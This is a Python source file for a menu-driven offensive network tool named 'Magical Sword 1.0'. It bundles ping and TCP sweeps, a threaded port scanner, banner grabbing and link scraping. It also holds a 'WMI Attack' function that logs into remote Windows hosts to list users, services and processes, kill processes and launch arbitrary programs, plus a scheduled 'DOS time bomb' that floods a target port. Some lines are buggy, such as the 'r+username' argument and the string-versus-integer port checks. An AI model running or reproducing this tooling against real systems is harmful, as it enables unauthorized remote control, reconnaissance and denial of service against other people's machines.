import os, socket, subprocess, time, threading, urllib, wmi
from datetime import datetime
from queue import Queue
from bs4 import BeautifulSoup

def getIP():
    host=input("url: ")
    print (socket.gethostbyname(host))

def ping_sweep():
    net = input("IP adrees of target: ")
    net1= net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("First Number: "))
    en1 = int(input("Last Number: "))
    en1=en1+1
    t1= datetime.now()
    print ("Ping sweep in process:")
    for ip in range(st1,en1):
        alamat = net2+str(ip)
        res = subprocess.call(['ping', alamat]) 
        if res == 0: print( "ping ke", alamat, "OK") 

    t2= datetime.now()
    total =t2-t1
    print ("Finish in: ",total)

def traceroute():
    ip=input("IP address of target: ")
    results=os.popen("pathping "+str(ip))	
    for i in results:print (i)

def tcp_sweep():
    net= input("IP address of target: ")
    net1= net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("First IP Number: "))
    en1 = int(input("Last IP Number: "))
    port = int(input("Port Number: "))
    en1=en1+1
    t1= datetime.now()
    def scan(addr):
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((addr,port))
        if result==0:return 1
        else :return 0

    def run1():
        for ip in range(st1,en1):
            addr = net2+str(ip)
            if (scan(addr)):print (addr , "live")

    run1()
    t2= datetime.now()
    total =t2-t1
    print ("Scanning finish in: " , total)

def port_scanner():
    socket.setdefaulttimeout(0.25)
    print_lock = threading.Lock()
    target = input('Target IP : ')
    t_IP = socket.gethostbyname(target)
    print ('Begin to scan: ', t_IP)

    def portscan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            con = s.connect((t_IP, port))
            with print_lock:print(port, ' open')
            con.close()
        except:pass

    def threader():
        while True:
            worker = q.get()
            portscan(worker)
            q.task_done()

    q = Queue()
    startTime = time.time()

    for x in range(100):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    for worker in range(1, 700): q.put(worker)

    q.join()
    print('Using time:', time.time() - startTime)

def banner_grabber():
    jawab = 'y'
    while(jawab == 'y'):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        alamat= input("IP Address: ")
        port = input("Port: ")
        result= s.connect_ex((alamat,int(port)))
        if result==0:
            if port==80: s.send(b'GET / HTTP/1.1\r\n\r\n')
            try:
                banner = s.recv(4096)
                print (banner.decode('ascii'))
            except:print ("Failed, no banner")
            finally:s.close()
        else:
            print ("Port " + port + " is dead")
            s.close()
        jawab = input("Repeat or not (y/n)? ")
        if jawab != 'y': break

def get_hyperlink():
    url = input("Put the URL : ") 
    page= urllib.request.urlopen(url)
    soup_object = BeautifulSoup(page.read())
    print (soup_object.title)
    print (soup_object.title.text)
    for link in soup_object.find_all('a'):print(link.get('href'))

def wmi_attack():
    ip=input("IP:")
    username=input("Username:")
    passwd=input("Password:")
    try:
        c = wmi.WMI(ip,user=r+username,password=passwd)
        for os in c.Win32_OperatingSystem():print (os.Caption) 

        isJalan1=input("See list of fixed drive target?(y/n)")
        if isJalan1=="y":
            print ("--------Fixed Drive---------")
            for disk in c.Win32_LogicalDisk(DriveType=3):print (disk)

        isJalan2=input("See list of Service Windows target?(y/n)")
        if isJalan2=="y":
            print ("--------Service Windows---------")
            for service in c.Win32_Service(State="Running"):print (service.Name)

        isJalan3=input("See list of running aplikasi Windows target?(y/n)")
        if isJalan3=="y":
            for i in c.Win32_Process(["Caption", "ProcessID"]):print (i.Caption, i. ProcessID)
            dead=input("Do you want to kill a process?(y/n)")
            if dead=="y":
                noid=input("id program to kill? ")
                c.Win32_Process(ProcessId=noid)[0].Terminate()

        isJalan4=input("See list of user from windows target?(y/n)")
        if isJalan4=="y":
            for group in c.Win32_Group():
                print (group.Caption+":")
                for user in group.associators(wmi_result_class="Win32_UserAccount"):print ("- " + user.Caption)

        isJalan5=input("Run an application from computer target?(y/n")
        if isJalan5=="y":
            aplikasi=input("Name of the application")
            SW_SHOWNORMAL = 1
            try:
                process_startup = c.Win32_ProcessStartup.new()
                process_startup.ShowWindow = SW_SHOWNORMAL
                process_id, result = c.Win32_Process.Create(CommandLine=aplikasi, ProcessStartupInformation=process_startup)
                if result == 0:print ("Process started successfully: %d" % process_id)
                else:print ("Failed")
            except:print ("Error")
    except:print ("Failed")

def dos_timebomb():
    jawab = 'y'
    while(jawab == 'y'): 
        alamat= input("IP Address: ")
        port = input("Port: ")
        awal=input("Time to begin the DOS? ")
        akhir=input("Time to finish the DOS? ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        waktu=time.strftime("%H", time.localtime())
        if str(waktu)==str(awal):
            try:
                result= s.connect_ex((alamat,int(port)))
                if port==80: s.send(b'GET / HTTP/1.1\r\n\r\n')
                s.send(b'Serangaaaaaaaaaan')
            except:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            if str(waktu)==str(akhir):
                break
                s.close()

def tampilan_atas():
    print ("===================================================")
    print ("#                                                 #")
    print ("#          Magical Sword 1.0                      #")
    print ("#          ---------------------                  #")
    print ("#          created by Wardana, 11-6-2019          #")
    print ("#                                                 #")
    print ("===================================================")

def menu():
    print ("\n")
    print ("----------- MENU ----------")
    print ("[1] Get IP from host name")
    print ("[2] Ping Sweep IP")
    print ("[3] Traceroute IP")
    print ("[4] TCP Sweep IP")
    print ("[5] Port Scanning IP")
    print ("[6] Banner Grabber IP")
    print ("[7] Data hyperlink website")
    print ("[8] WMI Attack")
    print ("[9] DOS time bomb")
    print ("[x] exit")

    menu = input("Choose MENU> ")
    print ("\n")

    if menu == "1":getIP()
    elif menu == "2":ping_sweep()
    elif menu == "3":traceroute()
    elif menu == "4":tcp_sweep()
    elif menu == "5":port_scanner()
    elif menu == "6":banner_grabber()
    elif menu == "7":get_hyperlink()
    elif menu == "8":wmi_attack()
    elif menu == "9":dos_timebomb()
    elif menu == "x":
        print ("Thanks to use this tool\n bye")
        exit()
    else:
        print ("Wrong choose!")                       

tampilan_atas()
jawab = 'y'
while(jawab == 'y'):
    menu()
    jawab = input("Repeat again (y/n)? ")
    if jawab != 'y': 
        print ("Thanks to use this tool\n bye")
        break  
